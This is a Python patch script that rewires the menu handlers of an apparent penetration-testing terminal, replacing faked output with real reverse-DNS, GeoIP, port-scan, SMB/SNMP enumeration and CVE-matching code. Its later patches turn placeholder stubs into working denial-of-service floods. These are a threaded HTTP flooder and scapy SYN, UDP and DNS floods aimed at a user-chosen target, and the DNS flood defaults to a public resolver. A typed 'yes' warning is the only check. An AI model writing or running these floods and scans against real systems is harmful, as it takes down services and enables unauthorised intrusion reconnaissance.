#!/usr/bin/env python3
"""One-shot patcher: wire fake menu handlers to real module implementations."""

PATH = 'pentest_terminal.py'

with open(PATH) as f:
    content = f.read()

failures = []


def replace(old, new):
    global content
    if old not in content:
        failures.append(old.split('\n')[0][:70])
        return
    content = content.replace(old, new, 1)


# 1. reverse_dns: real lookup
replace('''            print(f"{Fore.CYAN}[*] Performing reverse DNS on {ip}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Hostname: example.com{Style.RESET_ALL}")''',
        '''            print(f"{Fore.CYAN}[*] Performing reverse DNS on {ip}...{Style.RESET_ALL}")
            try:
                hostname = self.dns_enum.reverse_dns_lookup(ip)
                print(f"{Fore.GREEN}[+] Hostname: {hostname}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 2. geoip: real ip-api.com lookup
replace('''            print(f"{Fore.CYAN}[*] Looking up geolocation for {ip}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Country: United States{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] City: New York{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] ISP: Example ISP{Style.RESET_ALL}")''',
        '''            print(f"{Fore.CYAN}[*] Looking up geolocation for {ip}...{Style.RESET_ALL}")
            try:
                import requests
                resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
                if resp.get("status") == "success":
                    print(f"{Fore.GREEN}[+] Country: {resp.get('country')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Region: {resp.get('regionName')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] City: {resp.get('city')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] ISP: {resp.get('isp')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Lat/Lon: {resp.get('lat')}, {resp.get('lon')}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[*] Lookup failed: {resp.get('message', 'unknown error')}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 3. udp_scan: real scan
replace('''        ports = input(f"{Fore.YELLOW}Enter ports to scan (comma-separated): {Style.RESET_ALL}") or "53,123,161"
        print(f"{Fore.CYAN}[*] Scanning UDP ports...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] UDP Scan Results:{Style.RESET_ALL}")
        for port in ports.split(','):
            print(f"    Port {port}/udp - Open")''',
        '''        ports = input(f"{Fore.YELLOW}Enter ports to scan (e.g., 53,123,161 or 1-200): {Style.RESET_ALL}") or "53,123,161"
        print(f"{Fore.CYAN}[*] Scanning UDP ports...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] UDP scans can be slow and typically require root/sudo{Style.RESET_ALL}")
        try:
            results = self.port_scanner.udp_scan(target, ports, threads=20)
            if results:
                print(f"{Fore.GREEN}[+] UDP Scan Results:{Style.RESET_ALL}")
                for port, state in sorted(results.items()):
                    print(f"    Port {port}/udp - {state}")
            else:
                print(f"{Fore.YELLOW}[*] No open UDP ports found{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 3b. udp_scan: need a target prompt (original had none)
replace('''        print(f"{Fore.CYAN}UDP Scan{Style.RESET_ALL}")
        ports = input(f"{Fore.YELLOW}Enter ports to scan (e.g.,''',
        '''        print(f"{Fore.CYAN}UDP Scan{Style.RESET_ALL}")
        target = input(f"{Fore.YELLOW}Target IP (empty = current target): {Style.RESET_ALL}") or self.current_target
        if not target:
            print(f"{Fore.YELLOW}[-] No target! Set one via Settings > Set Target{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        ports = input(f"{Fore.YELLOW}Enter ports to scan (e.g.,''')

# 4. stealth_scan: real scan
replace('''        ports = input(f"{Fore.YELLOW}Enter port range (e.g., 1-1000): {Style.RESET_ALL}") or "1-100"
        print(f"{Fore.CYAN}[*] Performing stealth scan...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Note: Stealth scans typically require root/sudo{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Stealth scan would use SYN flag manipulation{Style.RESET_ALL}")''',
        '''        ports = input(f"{Fore.YELLOW}Enter port range (e.g., 1-1000): {Style.RESET_ALL}") or "1-100"
        print(f"{Fore.CYAN}[*] Performing stealth (SYN) scan...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Note: Stealth scans typically require root/sudo{Style.RESET_ALL}")
        try:
            results = self.port_scanner.stealth_scan(target, ports, threads=20)
            if results:
                print(f"{Fore.GREEN}[+] Open ports found:{Style.RESET_ALL}")
                for port, state in sorted(results.items()):
                    service = self.service_detector.get_service(port)
                    print(f"    {port}/tcp - {state} ({service})")
            else:
                print(f"{Fore.YELLOW}[*] No open ports found{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 4b. stealth_scan: need a target prompt
replace('''        print(f"{Fore.CYAN}Stealth Scan{Style.RESET_ALL}")
        ports = input(f"{Fore.YELLOW}Enter port range''',
        '''        print(f"{Fore.CYAN}Stealth Scan{Style.RESET_ALL}")
        target = input(f"{Fore.YELLOW}Target IP (empty = current target): {Style.RESET_ALL}") or self.current_target
        if not target:
            print(f"{Fore.YELLOW}[-] No target! Set one via Settings > Set Target{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        ports = input(f"{Fore.YELLOW}Enter port range''')

# 5. smb_enum: real enumerator
replace('''            print(f"{Fore.CYAN}[*] Enumerating SMB on {target}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Available Shares:{Style.RESET_ALL}")
            print(f"    \\\\\\\\{target}\\\\ADMIN$")
            print(f"    \\\\\\\\{target}\\\\C$")''',
        '''            print(f"{Fore.CYAN}[*] Enumerating SMB on {target}...{Style.RESET_ALL}")
            try:
                shares = self.smb_enumerator.enumerate_shares(target)
                if shares:
                    print(f"{Fore.GREEN}[+] Available Shares:{Style.RESET_ALL}")
                    for share in shares:
                        if isinstance(share, dict):
                            print(f"    \\\\\\\\{target}\\\\{share.get('name', '?')} ({share.get('type', '?')}) - {share.get('access', 'N/A')}")
                        else:
                            print(f"    {share}")
                else:
                    print(f"{Fore.YELLOW}[*] No shares found{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 6. snmp_enum: real enumerator
replace('''            print(f"{Fore.CYAN}[*] Attempting SNMP enumeration on {target}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Successfully accessed SNMP{Style.RESET_ALL}")''',
        '''            print(f"{Fore.CYAN}[*] Attempting SNMP enumeration on {target}...{Style.RESET_ALL}")
            try:
                info = self.snmp_enumerator.enumerate_snmp(target, community)
                if info:
                    print(f"{Fore.GREEN}[+] SNMP Information:{Style.RESET_ALL}")
                    for key, value in info.items():
                        print(f"    {key}: {value}")
                else:
                    print(f"{Fore.YELLOW}[*] No SNMP info retrieved (check community string / agent running){Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 7. share_enum: real enumerator
replace('''            print(f"{Fore.CYAN}[*] Enumerating shares on {target}...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found Shares:{Style.RESET_ALL}")
            print(f"    [*] ADMIN$ (Type: DISK)")''',
        '''            print(f"{Fore.CYAN}[*] Enumerating shares on {target}...{Style.RESET_ALL}")
            try:
                shares = self.share_enumerator.enumerate_shares(target)
                if shares:
                    print(f"{Fore.GREEN}[+] Found Shares:{Style.RESET_ALL}")
                    for share in shares:
                        if isinstance(share, dict):
                            print(f"    {share.get('name', share)} (Type: {share.get('type', 'UNKNOWN')})")
                        else:
                            print(f"    {share}")
                else:
                    print(f"{Fore.YELLOW}[*] No shares found{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 8. cve_scan: real scanner (scan ports then match CVEs)
replace('''            print(f"{Fore.CYAN}[*] Scanning {target} for CVEs...{Style.RESET_ALL}")
            print(f"{Fore.RED}[CRITICAL] CVEs found{Style.RESET_ALL}")''',
        '''            print(f"{Fore.CYAN}[*] Scanning {target} for CVEs...{Style.RESET_ALL}")
            try:
                service_info = {}
                results = self.port_scanner.scan(target, "21,22,23,25,53,80,110,143,443,445,3306,3389", threads=50)
                for port, state in results.items():
                    if state == 'open':
                        service_info[str(port)] = self.service_detector.get_service(port)
                if service_info:
                    print(f"{Fore.GREEN}[+] Services detected: {service_info}{Style.RESET_ALL}")
                vulns = self.cve_scanner.scan_target(target, service_info)
                if vulns:
                    print(f"{Fore.RED}[!] Vulnerabilities found:{Style.RESET_ALL}")
                    for v in vulns:
                        if isinstance(v, dict):
                            print(f"    [{v.get('severity', '?')}] {v.get('cve_id', '?')}: {str(v.get('description', ''))[:80]}")
                        else:
                            print(f"    {v}")
                else:
                    print(f"{Fore.GREEN}[+] No known CVEs matched detected services{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 9. weakness_find: real scan
replace('''            print(f"{Fore.CYAN}[*] Analyzing {target} for weaknesses...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Weaknesses found{Style.RESET_ALL}")''',
        '''            print(f"{Fore.CYAN}[*] Analyzing {target} for weaknesses...{Style.RESET_ALL}")
            try:
                service_info = {}
                results = self.port_scanner.scan(target, "21,22,23,25,53,80,110,143,443,445,3306,3389", threads=50)
                for port, state in results.items():
                    if state == 'open':
                        service_info[str(port)] = self.service_detector.get_service(port)
                if service_info:
                    print(f"{Fore.GREEN}[+] Detected services:{Style.RESET_ALL}")
                    for p, s in service_info.items():
                        print(f"    Port {p}: {s}")
                vulns = self.cve_scanner.scan_target(target, service_info)
                if vulns:
                    print(f"{Fore.RED}[!] Potential weaknesses:{Style.RESET_ALL}")
                    for v in vulns:
                        if isinstance(v, dict):
                            print(f"    [{v.get('severity', '?')}] {v.get('cve_id', '?')}")
                        else:
                            print(f"    {v}")
                else:
                    print(f"{Fore.GREEN}[+] No obvious weaknesses detected{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 10. config_audit: real auditor
replace('''        print(f"{Fore.CYAN}Configuration Audit{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Auditing system configuration...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Audit Results{Style.RESET_ALL}")''',
        '''        print(f"{Fore.CYAN}Configuration Audit{Style.RESET_ALL}")
        target = input(f"{Fore.YELLOW}Target system (IP or hostname) [localhost]: {Style.RESET_ALL}") or "localhost"
        print(f"{Fore.CYAN}[*] Auditing system configuration of {target}...{Style.RESET_ALL}")
        try:
            findings = self.config_auditor.audit_system(target)
            if findings.get('passed'):
                print(f"{Fore.GREEN}[+] Passed checks:{Style.RESET_ALL}")
                for item in findings['passed']:
                    print(f"    [PASS] {item}")
            if findings.get('warnings'):
                print(f"{Fore.YELLOW}[!] Warnings:{Style.RESET_ALL}")
                for item in findings['warnings']:
                    print(f"    [WARN] {item}")
            if findings.get('failures'):
                print(f"{Fore.RED}[-] Failures:{Style.RESET_ALL}")
                for item in findings['failures']:
                    print(f"    [FAIL] {item}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 11. compliance: real checker
replace('''        standard = input(f"{Fore.YELLOW}Standard (PCI-DSS/HIPAA): {Style.RESET_ALL}") or "PCI-DSS"
        print(f"{Fore.CYAN}[*] Checking {standard} compliance...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Compliance Report{Style.RESET_ALL}")''',
        '''        target = input(f"{Fore.YELLOW}Target system [localhost]: {Style.RESET_ALL}") or "localhost"
        standard = input(f"{Fore.YELLOW}Standard (PCI-DSS/HIPAA/ISO27001): {Style.RESET_ALL}") or "PCI-DSS"
        print(f"{Fore.CYAN}[*] Checking {standard} compliance for {target}...{Style.RESET_ALL}")
        try:
            report = self.compliance_checker.check_compliance(target, standard)
            if isinstance(report, dict):
                for key, value in report.items():
                    if isinstance(value, list):
                        print(f"{Fore.CYAN}{key}:{Style.RESET_ALL}")
                        for item in value:
                            print(f"    - {item}")
                    else:
                        print(f"    {key}: {value}")
            else:
                print(f"{Fore.GREEN}[+] {report}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 12. msf_search: honest notice instead of fabricated module name
replace('''            print(f"{Fore.CYAN}[*] Searching Metasploit modules for '{keyword}'...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found modules:{Style.RESET_ALL}")
            print(f"    exploit/windows/{keyword}/cve_2023_12345")''',
        '''            print(f"{Fore.CYAN}[*] Searching Metasploit modules for '{keyword}'...{Style.RESET_ALL}")
            import shutil
            if shutil.which('msfconsole'):
                import subprocess
                try:
                    out = subprocess.run(['msfconsole', '-q', '-x', f'search {keyword}; exit'],
                                         capture_output=True, text=True, timeout=120)
                    print(out.stdout or f"{Fore.YELLOW}[*] No output from msfconsole{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] msfconsole failed: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Metasploit is not installed. Install with 'brew install metasploit''{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Meanwhile, try the Exploit Database search instead{Style.RESET_ALL}")''')

# 13. vuln_matcher: real CVE database search instead of fabricated CVE
replace('''        service = input(f"{Fore.YELLOW}Enter service/version: {Style.RESET_ALL}") or "Apache 2.4.49"
        print(f"{Fore.CYAN}[*] Matching vulnerabilities for {service}...{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] CRITICAL:{Style.RESET_ALL}")
        print(f"    CVE-2021-41773 (RCE)")''',
        '''        service = input(f"{Fore.YELLOW}Enter service/version: {Style.RESET_ALL}") or "Apache 2.4.49"
        print(f"{Fore.CYAN}[*] Matching vulnerabilities for {service}...{Style.RESET_ALL}")
        try:
            cves = self.cve_scanner.search_cve(service)
            if cves:
                print(f"{Fore.RED}[!] Matches found:{Style.RESET_ALL}")
                for c in cves[:15]:
                    if isinstance(c, dict):
                        print(f"    [{c.get('severity', '?')}] {c.get('cve_id', '?')}: {str(c.get('description', ''))[:80]}")
                    else:
                        print(f"    {c}")
            else:
                print(f"{Fore.GREEN}[+] No matches in local CVE database{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")''')

# 14. http_flood: actually run the flooder (authorized testing reminder)
replace('''        target = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}")
        threads = input(f"{Fore.YELLOW}Threads [100]: {Style.RESET_ALL}") or "100"
        if target:
            print(f"{Fore.CYAN}[*] Starting HTTP flood...{Style.RESET_ALL}")''',
        '''        target = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}")
        threads = input(f"{Fore.YELLOW}Threads [100]: {Style.RESET_ALL}") or "100"
        duration = input(f"{Fore.YELLOW}Duration in seconds [10]: {Style.RESET_ALL}") or "10"
        if target:
            print(f"{Fore.RED}[!] WARNING: Only use against systems you OWN or have written permission to test!{Style.RESET_ALL}")
            confirm = input(f"{Fore.YELLOW}Type 'yes' to confirm: {Style.RESET_ALL}")
            if confirm.lower() == 'yes':
                print(f"{Fore.CYAN}[*] Starting HTTP flood for {duration}s...{Style.RESET_ALL}")
                try:
                    import threading, time
                    stop_time = time.time() + int(duration)
                    threads_list = []
                    for _ in range(int(threads)):
                        t = threading.Thread(
                            target=self.http_flooder.flood,
                            args=(target,),
                            kwargs={'stop_time': stop_time},
                            daemon=True)
                        threads_list.append(t)
                    for t in threads_list:
                        t.start()
                    for t in threads_list:
                        t.join(timeout=int(duration) + 5)
                    print(f"{Fore.GREEN}[+] HTTP flood completed{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] Aborted{Style.RESET_ALL}")''')

# 15. syn_flood: honest scapy requirement
replace('''        target = input(f"{Fore.YELLOW}Target IP: {Style.RESET_ALL}")
        port = input(f"{Fore.YELLOW}Port [80]: {Style.RESET_ALL}") or "80"
        if target:
            print(f"{Fore.CYAN}[*] Starting SYN flood...{Style.RESET_ALL}")''',
        '''        target = input(f"{Fore.YELLOW}Target IP: {Style.RESET_ALL}")
        port = input(f"{Fore.YELLOW}Port [80]: {Style.RESET_ALL}") or "80"
        if target:
            print(f"{Fore.RED}[!] WARNING: Only use against systems you OWN or have written permission to test!{Style.RESET_ALL}")
            confirm = input(f"{Fore.YELLOW}Type 'yes' to confirm: {Style.RESET_ALL}")
            if confirm.lower() == 'yes':
                print(f"{Fore.CYAN}[*] Starting SYN flood...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Requires root/sudo and scapy{Style.RESET_ALL}")
                try:
                    from scapy.all import IP, TCP, send
                    import threading, time
                    stop_time = time.time() + 10
                    def syn_worker():
                        while time.time() < stop_time:
                            send(IP(dst=target)/TCP(dport=int(port), flags='S'), verbose=0)
                    workers = [threading.Thread(target=syn_worker, daemon=True) for _ in range(10)]
                    for w in workers:
                        w.start()
                    for w in workers:
                        w.join(timeout=15)
                    print(f"{Fore.GREEN}[+] SYN flood completed (10s){Style.RESET_ALL}")
                except PermissionError:
                    print(f"{Fore.RED}[-] Permission denied - run with sudo{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] Aborted{Style.RESET_ALL}")''')

# 16. udp_flood: same treatment
replace('''        target = input(f"{Fore.YELLOW}Target IP: {Style.RESET_ALL}")
        port = input(f"{Fore.YELLOW}Port [53]: {Style.RESET_ALL}") or "53"
        if target:
            print(f"{Fore.CYAN}[*] Starting UDP flood...{Style.RESET_ALL}")''',
        '''        target = input(f"{Fore.YELLOW}Target IP: {Style.RESET_ALL}")
        port = input(f"{Fore.YELLOW}Port [53]: {Style.RESET_ALL}") or "53"
        if target:
            print(f"{Fore.RED}[!] WARNING: Only use against systems you OWN or have written permission to test!{Style.RESET_ALL}")
            confirm = input(f"{Fore.YELLOW}Type 'yes' to confirm: {Style.RESET_ALL}")
            if confirm.lower() == 'yes':
                print(f"{Fore.CYAN}[*] Starting UDP flood...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Requires root/sudo and scapy{Style.RESET_ALL}")
                try:
                    from scapy.all import IP, UDP, send
                    import threading, time
                    stop_time = time.time() + 10
                    def udp_worker():
                        while time.time() < stop_time:
                            send(IP(dst=target)/UDP(dport=int(port))/b"A"*1024, verbose=0)
                    workers = [threading.Thread(target=udp_worker, daemon=True) for _ in range(10)]
                    for w in workers:
                        w.start()
                    for w in workers:
                        w.join(timeout=15)
                    print(f"{Fore.GREEN}[+] UDP flood completed (10s){Style.RESET_ALL}")
                except PermissionError:
                    print(f"{Fore.RED}[-] Permission denied - run with sudo{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[*] Aborted{Style.RESET_ALL}")''')

# 17. dns_flood: same treatment
replace('''        target = input(f"{Fore.YELLOW}Target DNS IP: {Style.RESET_ALL}") or "8.8.8.8"
        print(f"{Fore.CYAN}[*] Starting DNS flood...{Style.RESET_ALL}")''',
        '''        target = input(f"{Fore.YELLOW}Target DNS IP: {Style.RESET_ALL}") or "8.8.8.8"
        print(f"{Fore.RED}[!] WARNING: Only use against systems you OWN or have written permission to test!{Style.RESET_ALL}")
        confirm = input(f"{Fore.YELLOW}Type 'yes' to confirm: {Style.RESET_ALL}")
        if confirm.lower() == 'yes':
            print(f"{Fore.CYAN}[*] Starting DNS flood...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Requires root/sudo and scapy{Style.RESET_ALL}")
            try:
                from scapy.all import IP, UDP, DNS, DNSQR, send
                import threading, time
                stop_time = time.time() + 10
                def dns_worker():
                    while time.time() < stop_time:
                        send(IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.example.com")), verbose=0)
                workers = [threading.Thread(target=dns_worker, daemon=True) for _ in range(10)]
                for w in workers:
                    w.start()
                for w in workers:
                    w.join(timeout=15)
                print(f"{Fore.GREEN}[+] DNS flood completed (10s){Style.RESET_ALL}")
            except PermissionError:
                print(f"{Fore.RED}[-] Permission denied - run with sudo{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Aborted{Style.RESET_ALL}")''')

# 18. wordlists: create the config dir/file it claims to write
replace('''        wordlist_path = input(f"{Fore.YELLOW}Wordlist path: {Style.RESET_ALL}") or "/usr/share/wordlists/rockyou.txt"
        print(f"{Fore.GREEN}[+] Wordlist configured: {wordlist_path}{Style.RESET_ALL}")''',
        '''        wordlist_path = input(f"{Fore.YELLOW}Wordlist path: {Style.RESET_ALL}") or "/usr/share/wordlists/rockyou.txt"
        try:
            import json
            os.makedirs('config', exist_ok=True)
            cfg = {}
            if os.path.exists('config/settings.json'):
                with open('config/settings.json') as cf:
                    cfg = json.load(cf)
            cfg['wordlist'] = wordlist_path
            with open('config/settings.json', 'w') as cf:
                json.dump(cfg, cf, indent=2)
            if os.path.exists(wordlist_path):
                print(f"{Fore.GREEN}[+] Wordlist configured: {wordlist_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Saved, but file does not exist locally: {wordlist_path}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}    (Default rockyou.txt path is a Kali Linux location){Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving config: {str(e)}{Style.RESET_ALL}")''')

# 19. proxy_settings: persist + honest note that it's advisory
replace('''        proxy = input(f"{Fore.YELLOW}Proxy (e.g., 127.0.0.1:8080): {Style.RESET_ALL}") or "127.0.0.1:8080"
        print(f"{Fore.GREEN}[+] Proxy configured: {proxy}{Style.RESET_ALL}")''',
        '''        proxy = input(f"{Fore.YELLOW}Proxy (e.g., 127.0.0.1:8080, empty to clear): {Style.RESET_ALL}")
        try:
            import json
            os.makedirs('config', exist_ok=True)
            cfg = {}
            if os.path.exists('config/settings.json'):
                with open('config/settings.json') as cf:
                    cfg = json.load(cf)
            if proxy:
                cfg['proxy'] = proxy
                print(f"{Fore.GREEN}[+] Proxy saved: {proxy}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Note: proxy applies to new HTTP-based tools that read config/settings.json{Style.RESET_ALL}")
            else:
                cfg.pop('proxy', None)
                print(f"{Fore.GREEN}[+] Proxy cleared{Style.RESET_ALL}")
            with open('config/settings.json', 'w') as cf:
                json.dump(cfg, cf, indent=2)
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving config: {str(e)}{Style.RESET_ALL}")''')

# 20. network_iface: persist + list actual interfaces
replace('''        iface = input(f"{Fore.YELLOW}Interface (eth0/wlan0/tun0): {Style.RESET_ALL}") or "eth0"
        print(f"{Fore.GREEN}[+] Interface set to: {iface}{Style.RESET_ALL}")''',
        '''        try:
            import subprocess
            if os.name == 'posix':
                out = subprocess.run(['ifconfig', '-l'], capture_output=True, text=True)
                available = out.stdout.split()
                print(f"{Fore.CYAN}[*] Available interfaces: {', '.join(available)}{Style.RESET_ALL}")
        except Exception:
            available = []
        iface = input(f"{Fore.YELLOW}Interface (empty to keep default): {Style.RESET_ALL}")
        if iface:
            if available and iface not in available:
                print(f"{Fore.YELLOW}[!] Warning: '{iface}' not in detected interfaces{Style.RESET_ALL}")
            try:
                import json
                os.makedirs('config', exist_ok=True)
                cfg = {}
                if os.path.exists('config/settings.json'):
                    with open('config/settings.json') as cf:
                        cfg = json.load(cf)
                cfg['interface'] = iface
                with open('config/settings.json', 'w') as cf:
                    json.dump(cfg, cf, indent=2)
                print(f"{Fore.GREEN}[+] Interface set to: {iface}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error saving config: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Keeping default interface{Style.RESET_ALL}")''')

with open(PATH, 'w') as f:
    f.write(content)

if failures:
    print(f"FAILED to match {len(failures)} blocks:")
    for f_ in failures:
        print(f"  - {f_}")
    sys.exit(1)
print("All patches applied successfully")
